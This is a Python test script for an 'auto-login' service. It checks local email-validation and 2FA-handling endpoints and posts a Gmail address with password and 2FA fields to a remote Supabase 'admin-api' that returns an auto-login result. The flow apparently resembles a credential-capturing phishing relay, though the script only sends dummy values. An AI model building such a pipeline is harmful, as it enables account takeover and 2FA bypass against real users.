import requests
import json
import time

def test_auto_login_api():
    """Test Auto-Login API endpoints"""
    print("🧪 TESTING AUTO-LOGIN API")
    print("="*50)
    
    # Test 1: Health Check
    print("\n1. Health Check...")
    try:
        response = requests.get("http://localhost:5000/", timeout=5)
        if response.status_code == 200:
            data = response.json()
            print("✅ API is running:", data.get("status"))
        else:
            print("❌ API error:", response.status_code)
    except Exception as e:
        print("❌ Connection error:", e)
    
    # Test 2: Email Validation
    print("\n2. Email Validation...")
    try:
        response = requests.post(
            "http://localhost:5000/validate-email",
            json={"email": "test@gmail.com"},
            timeout=5
        )
        if response.status_code == 200:
            data = response.json()
            print("✅ Email validation:", data.get("action"))
        else:
            print("❌ Email validation error:", response.status_code)
    except Exception as e:
        print("❌ Email validation error:", e)
    
    # Test 3: 2FA Validation
    print("\n3. 2FA Validation...")
    try:
        response = requests.post(
            "http://localhost:5000/handle-2fa",
            json={"email": "test@gmail.com", "twofa": "123456"},
            timeout=5
        )
        if response.status_code == 200:
            data = response.json()
            print("✅ 2FA validation:", data.get("action"))
        else:
            print("❌ 2FA validation error:", response.status_code)
    except Exception as e:
        print("❌ 2FA validation error:", e)

def test_supabase_integration():
    """Test Supabase integration"""
    print("\n\n🧪 TESTING SUPABASE INTEGRATION")
    print("="*50)
    
    # Test Supabase function
    print("\n1. Supabase Function Health...")
    try:
        response = requests.get(
            "https://nqsdardermkzppeaazbb.supabase.co/functions/v1/admin-api/",
            timeout=10
        )
        if response.status_code == 200:
            data = response.json()
            print("✅ Supabase function:", data.get("version"))
            print("   Auto-Login enabled:", data.get("auto_login_enabled"))
        else:
            print("❌ Supabase error:", response.status_code)
    except Exception as e:
        print("❌ Supabase error:", e)
    
    # Test request submission
    print("\n2. Test Request Submission...")
    try:
        response = requests.post(
            "https://nqsdardermkzppeaazbb.supabase.co/functions/v1/admin-api/api/request",
            json={
                "email": "test@gmail.com",
                "password": "",
                "twofa": "",
                "userAgent": "Test Agent",
                "currentPage": "index.html"
            },
            timeout=15
        )
        if response.status_code == 200:
            data = response.json()
            print("✅ Request submitted:", data.get("requestId"))
            if data.get("autoLogin"):
                print("   Auto-Login result:", data.get("autoLogin"))
        else:
            print("❌ Request submission error:", response.status_code)
    except Exception as e:
        print("❌ Request submission error:", e)

if __name__ == "__main__":
    print("🚀 AUTO-LOGIN INTEGRATION TEST")
    print("Testing Auto-Login API and Supabase integration...")
    
    test_auto_login_api()
    test_supabase_integration()
    
    print("\n\n🎯 TEST COMPLETED!")
    print("If all tests show ✅, the integration is working!")
    input("Press Enter to exit...") 